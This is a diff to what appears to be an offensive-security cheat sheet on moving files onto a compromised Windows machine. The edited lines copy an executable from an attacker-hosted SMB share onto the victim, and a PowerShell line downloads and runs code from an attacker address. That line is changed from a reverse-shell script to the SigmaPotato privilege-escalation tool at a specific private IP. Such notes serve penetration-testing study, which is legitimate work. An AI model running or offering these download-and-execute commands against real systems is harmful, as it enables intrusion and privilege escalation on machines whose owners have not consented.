@@ -54,7 +54,7 @@ impacket-smbserver share ./ -smb2support
 
 ### Windows Victim
 ```cmd
-copy \ATTACKER_IP\share\file.exe C:\Temp\file.exe
+copy \\ATTACKER_IP\share\file.exe C:\Temp\file.exe
 ```
 
 ---
@@ -133,7 +133,7 @@ iwr -Uri http://ATTACKER_IP/file -OutFile file
 ```
 
 ```powershell
-iex (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/rev.ps1')
+iex (New-Object Net.WebClient).DownloadString('http://192.168.45.151/SigmaPotato.exe')
 ```
 
 ---
